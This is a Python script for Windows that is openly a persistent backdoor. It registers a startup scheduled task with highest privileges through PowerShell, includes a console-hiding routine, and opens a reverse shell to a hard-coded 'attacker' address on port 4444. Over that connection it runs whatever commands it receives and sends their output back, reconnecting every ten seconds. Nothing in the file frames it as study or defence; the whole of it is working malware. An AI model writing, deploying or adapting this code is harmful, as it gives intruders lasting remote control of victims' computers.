import os
import subprocess
import socket
import sys
import time
import ctypes
import platform

def hide_window():
    if platform.system() == 'Windows':
        # Hides the console window in Windows
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def make_persistent():
    # Get the path to the Python executable and the current script
    python_path = os.path.realpath(os.__file__).replace('lib\\os.py', 'python.exe')
    script_path = os.path.realpath(__file__)

    # PowerShell script to create startup and shutdown scheduled tasks
    powershell_script = f'''
    $action = New-ScheduledTaskAction -Execute "{python_path}" -Argument "{script_path}"
    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -Action $action -Trigger $startupTrigger -TaskName "PersistentPythonScript_Startup" -Description "Runs the Python script at system startup" -RunLevel Highest -Force
    '''

    # Running the PowerShell script to create the tasks
    subprocess.run(["powershell", "-Command", powershell_script], shell=True)

# Check if the script is already persistent
def is_persistent():
    result = subprocess.run(["powershell", "-Command", "Get-ScheduledTask -TaskName PersistentPythonScript_Startup"], capture_output=True, text=True)
    return "PersistentPythonScript_Startup" in result.stdout

# Function to install missing libraries
def install_dependencies():
    try:
        import pip
    except ImportError:
        print("Pip not found. Installing pip...")
        subprocess.check_call([sys.executable, '-m', 'ensurepip', '--upgrade'])
    
    required_libraries = ['socket', 'ctypes', 'platform']

    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            print(f"{lib} is missing. Installing...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])

# Reverse shell function
def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            # Attempt to connect to the attacker machine
            s.connect((attacker_ip, attacker_port))
            print(f"Connected to {attacker_ip} on port {attacker_port}")
            
            while True:
                # Receive command from the attacker machine
                command = s.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                
                # Execute the command and send the result back
                if command:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output, error = process.communicate()
                    s.send(output + error)
            break
    
        except socket.error as err:
            print(f"Connection error: {err}. Retrying in 10 seconds...")
            time.sleep(10)  # Retry after 10 seconds
    
        finally:
            s.close()

# Main function
if __name__ == "__main__":
    #hide_window()  # Hide the window when the script starts

    # Install any missing dependencies
    install_dependencies()

    # Check if the script is already registered as persistent
    if not is_persistent():
        make_persistent()
        print("The script has been made persistent.")
    else:
        print("The script is already persistent.")

    # Add the main logic of your script here
    print("Running the main part of the script...")

    # IP and port for the reverse shell
    attacker_ip = '10.211.55.24'  # Replace with actual IP
    attacker_port = 4444  # Port for the reverse shell

    reverse_shell(attacker_ip, attacker_port)